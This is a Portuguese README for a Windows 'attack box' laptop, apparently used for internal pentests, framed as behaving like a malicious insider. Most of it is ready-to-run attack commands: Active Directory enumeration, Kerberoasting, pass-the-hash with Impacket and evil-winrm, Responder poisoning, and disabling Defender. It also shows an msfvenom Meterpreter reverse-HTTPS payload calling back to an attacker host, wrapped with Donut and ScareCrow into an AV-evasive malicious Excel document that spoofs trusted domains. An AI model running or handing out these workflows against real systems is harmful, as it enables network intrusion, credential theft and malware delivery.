# 🎯 Notebook 2 - Windows Attack Box

## Hardware
- **CPU**: Intel i5-3210M (2 cores, 4 threads)
- **RAM**: 12GB DDR3
- **OS**: Windows 11 Pro

---

## 🔥 Função Principal

**Máquina Windows Attack Box** - Comporta-se como um **insider malicioso**, especializada em:
- Exploração em redes Windows/Active Directory
- Execução de payloads .NET
- Ataques de lateral movement
- Testes realistas de post-exploitation
- Integração com Kali via WSL2

---

## 🚀 Setup Rápido

### **Opção 1: Script Otimizado (RECOMENDADO)**

```cmd
# Execute como Administrador
.\atack2.0-optimized.bat
```

### **Opção 2: Script Original**

```cmd
.\atack2.0.bat
```

---

## 🛠️ Ferramentas Instaladas

### **Active Directory (C:\Tools\AD\)**

| Ferramenta | Uso | Comando Rápido |
|------------|-----|----------------|
| **BloodHound** | Análise visual de AD | `C:\Tools\AD\Bloodhound\BloodHound.exe` |
| **SharpHound** | Coletor de dados AD | `.\SharpHound.exe -c All` |
| **PowerView** | Enumeration AD via PowerShell | `Import-Module .\PowerView.ps1` |
| **PowerUp** | Privilege escalation | `Import-Module .\PowerUp.ps1` |

#### Exemplo de uso:
```powershell
# Coletar dados AD
cd C:\Tools\AD\SharpHound
.\SharpHound.exe -c All -d corp.local

# Importar no BloodHound
C:\Tools\AD\Bloodhound\BloodHound.exe
```

---

### **Post-Exploitation (C:\Tools\PostEx\)**

| Ferramenta | Uso | Comando Exemplo |
|------------|-----|-----------------|
| **Rubeus** | Kerberos attacks | `Rubeus.exe kerberoast` |
| **Seatbelt** | System enumeration | `Seatbelt.exe -group=all` |
| **WinPEAS** | Privilege escalation finder | `winPEASx64.exe` |
| **Certify** | AD Certificate Services attacks | `Certify.exe find /vulnerable` |
| **SharpDPAPI** | DPAPI credential extraction | `SharpDPAPI.exe` |

#### Workflow típico:
```powershell
# 1. Enumerar sistema
cd C:\Tools\PostEx\WinPEAS
.\winPEASx64.exe

# 2. Kerberoasting
cd C:\Tools\PostEx\Rubeus\Rubeus\bin\Release
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 3. Verificar AD CS vulnerabilidades
cd C:\Tools\PostEx\Certify
.\Certify.exe find /vulnerable
```

---

### **Payloads & Evasion (C:\Tools\Payloads\)**

| Ferramenta | Uso | Exemplo |
|------------|-----|---------|
| **Donut** | EXE → Shellcode | `donut.exe -f payload.exe -o payload.bin` |
| **ScareCrow** | Bypass AV (Office/HTA/MSI) | `ScareCrow -I payload.bin -domain microsoft.com` |
| **Nimcrypt2** | .NET crypter | `python nimcrypt.py -f payload.exe` |

#### Criar payload Office:
```bash
# 1. Gerar shellcode com Donut
cd C:\Tools\Payloads\Donut
.\donut.exe -f C:\payloads\reverse.exe -o payload.bin

# 2. Ofuscar com ScareCrow
cd C:\Tools\Payloads\ScareCrow
.\ScareCrow.exe -I C:\Tools\Payloads\Donut\payload.bin -Loader excel -domain trusted.com
```

---

### **Lateral Movement (C:\Tools\Tools\)**

| Ferramenta | Uso | Comando |
|------------|-----|---------|
| **Evil-WinRM** | WinRM shell | `evil-winrm -i 192.168.1.10 -u admin -p pass` |
| **Impacket** | SMB/LDAP/Kerberos | `psexec.py domain/user:pass@192.168.1.10` |
| **Responder** | LLMNR/NBT-NS poisoning | `python Responder.py -I eth0 -wrf` |

#### Pass-the-Hash com Impacket:
```bash
cd C:\Tools\Tools\Impacket\examples

# PSExec
python psexec.py -hashes :ntlmhash administrator@192.168.1.10

# WMIExec
python wmiexec.py -hashes :ntlmhash administrator@192.168.1.10

# SecretsDump
python secretsdump.py domain/user:pass@192.168.1.10
```

---

## 🐧 Integração WSL2 + Kali

### **Instalação**

```powershell
# Após reiniciar (o script já habilitou WSL2)
wsl --install -d kali-linux
```

### **Setup Kali dentro do WSL**

```bash
# Atualizar
sudo apt update && sudo apt upgrade -y

# Instalar ferramentas essenciais
sudo apt install -y \
    bloodhound \
    python3-impacket \
    crackmapexec \
    smbmap \
    enum4linux-ng \
    kerbrute \
    responder

# Neo4j para BloodHound
sudo apt install -y neo4j bloodhound
```

### **Workflow Híbrido Windows + Kali**

```bash
# No Kali (WSL):
# 1. Enumerar SMB
crackmapexec smb 192.168.1.0/24

# 2. Coletar dados AD
bloodhound-python -u user -p pass -d corp.local -ns 192.168.1.10

# 3. Kerberoasting
GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.1.10 -request

# No Windows:
# 4. Importar dados no BloodHound GUI
C:\Tools\AD\Bloodhound\BloodHound.exe

# 5. Executar payloads .NET
cd C:\Tools\PostEx\Rubeus
.\Rubeus.exe asktgt /user:admin /rc4:hash
```

---

## 🎯 Casos de Uso Reais

### **Cenário 1: Internal Pentest - Active Directory**

```powershell
# 1. Enumerar domínio
cd C:\Tools\AD\PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser

# 2. Coletar dados BloodHound
cd C:\Tools\AD\SharpHound
.\SharpHound.exe -c All

# 3. Kerberoasting
cd C:\Tools\PostEx\Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# 4. Analisar no BloodHound
C:\Tools\AD\Bloodhound\BloodHound.exe
# Importar o ZIP do SharpHound
```

### **Cenário 2: Payload Office Malicioso**

```bash
# 1. Gerar payload Meterpreter (Kali WSL)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.10.5 LPORT=443 \
    -f exe -o /mnt/c/Tools/Payloads/payload.exe

# 2. Converter para shellcode (Windows)
cd C:\Tools\Payloads\Donut
.\donut.exe -f ..\payload.exe -o payload.bin

# 3. Criar documento Office malicioso
cd C:\Tools\Payloads\ScareCrow
.\ScareCrow.exe -I ..\Donut\payload.bin -Loader excel -domain contoso.com
```

### **Cenário 3: Lateral Movement**

```bash
# 1. Enumerar rede (Kali WSL)
crackmapexec smb 192.168.1.0/24 -u user -p pass --shares

# 2. Extrair credenciais (Windows + Mimikatz)
# Baixar Mimikatz manualmente em C:\Tools\Tools\Mimikatz

# 3. Pass-the-Hash
evil-winrm -i 192.168.1.50 -u administrator -H ntlmhash

# 4. Executar Seatbelt remotamente
cd C:\Tools\PostEx\Seatbelt
.\Seatbelt.exe -group=all -computername=192.168.1.50
```

---

## 📂 Estrutura de Engagements

### **Organização Recomendada**

```
C:\Tools\Engagements\
├── ClienteA\
│   ├── recon\
│   │   ├── bloodhound_data.zip
│   │   ├── sharphound_output.json
│   │   └── enum.txt
│   ├── loot\
│   │   ├── credentials.txt
│   │   ├── hashes.txt
│   │   └── tickets.kirbi
│   └── payloads\
│       ├── office_macro.xlsm
│       └── hta_dropper.hta
```

### **Comandos para organizar**

```powershell
# Criar estrutura para novo engagement
$client = "ClienteX"
mkdir C:\Tools\Engagements\$client
mkdir C:\Tools\Engagements\$client\recon
mkdir C:\Tools\Engagements\$client\loot
mkdir C:\Tools\Engagements\$client\payloads
```

---

## ⚠️ Hardening Reverso (Desativar AV)

O script já configura exclusões, mas para controle manual:

### **Desativar Defender**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath "C:\Tools"
```

### **Reativar Defender**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
```

**Ou use**: `C:\Windows\rollback.bat`

---

## 🔧 Compilação de Ferramentas .NET

Muitas ferramentas precisam ser compiladas:

### **Visual Studio Community**
```powershell
choco install -y visualstudio2022community
choco install -y visualstudio2022-workload-manageddesktop
```

### **Compilar Rubeus**
```powershell
cd C:\Tools\PostEx\Rubeus
# Abrir Rubeus.sln no Visual Studio
# Build > Build Solution
# Binary em: bin\Release\Rubeus.exe
```

### **Compilar Seatbelt**
```powershell
cd C:\Tools\PostEx\Seatbelt
# Abrir Seatbelt.sln no Visual Studio
# Build > Build Solution
```

---

## 📚 Aliases PowerShell (Já configurados)

```powershell
# Quick navigation
goto-tools      # cd C:\Tools
goto-ad         # cd C:\Tools\AD
goto-postex     # cd C:\Tools\PostEx
goto-payloads   # cd C:\Tools\Payloads
goto-loot       # cd C:\Tools\Loot

# Aliases
ll              # ls
la              # ls -Force
grep            # Select-String
```

---

## 🔄 Manutenção

### **Atualizar ferramentas**
```powershell
# Git repositories
cd C:\Tools\PostEx\Rubeus
git pull

cd C:\Tools\Tools\Impacket
git pull
pip install . --upgrade
```

### **Limpar loot antigo**
```powershell
Remove-Item C:\Tools\Loot\* -Recurse -Force
```

---

## 🎓 Recursos de Aprendizado

- [BloodHound Docs](https://bloodhound.readthedocs.io/)
- [Rubeus Guide](https://github.com/GhostPack/Rubeus)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks Windows](https://book.hacktricks.xyz/windows-hardening/)

---

**Notebook 2 está pronto para ataques Windows realistas! 🔥**
